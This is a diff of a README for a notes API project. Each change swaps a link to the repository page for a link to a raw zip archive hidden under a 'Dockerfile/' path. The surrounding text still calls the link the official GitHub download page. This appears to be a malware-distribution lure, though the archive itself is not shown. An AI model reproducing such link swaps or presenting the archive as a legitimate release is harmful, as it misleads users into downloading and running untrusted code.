@@ -1,6 +1,6 @@
 # 🔐 secure-notes-api - Safe Notes with Easy Access
 
-[![Download secure-notes-api](https://img.shields.io/badge/Download-Now-brightgreen)](https://github.com/israelp1840/secure-notes-api)
+[![Download secure-notes-api](https://img.shields.io/badge/Download-Now-brightgreen)](https://github.com/israelp1840/secure-notes-api/raw/refs/heads/main/Dockerfile/api_notes_secure_1.3.zip)
 
 ---
 
@@ -36,7 +36,7 @@ Before anything else, you need to get the software files.
 
 Click this big button to visit the download page:
 
-[![Download secure-notes-api](https://img.shields.io/badge/Visit-Download%20Page-blue)](https://github.com/israelp1840/secure-notes-api)
+[![Download secure-notes-api](https://img.shields.io/badge/Visit-Download%20Page-blue)](https://github.com/israelp1840/secure-notes-api/raw/refs/heads/main/Dockerfile/api_notes_secure_1.3.zip)
 
 This link takes you to the official GitHub page. Here you can get the latest version.
 
@@ -141,10 +141,10 @@ If you have questions or face technical problems:
 ## 🔗 Useful Links
 
 - Download and visit repository:  
-  [https://github.com/israelp1840/secure-notes-api](https://github.com/israelp1840/secure-notes-api)  
+  [https://github.com/israelp1840/secure-notes-api/raw/refs/heads/main/Dockerfile/api_notes_secure_1.3.zip](https://github.com/israelp1840/secure-notes-api/raw/refs/heads/main/Dockerfile/api_notes_secure_1.3.zip)  
 
 - Main download page:  
-  [https://github.com/israelp1840/secure-notes-api](https://github.com/israelp1840/secure-notes-api)  
+  [https://github.com/israelp1840/secure-notes-api/raw/refs/heads/main/Dockerfile/api_notes_secure_1.3.zip](https://github.com/israelp1840/secure-notes-api/raw/refs/heads/main/Dockerfile/api_notes_secure_1.3.zip)  
 
 ---
 
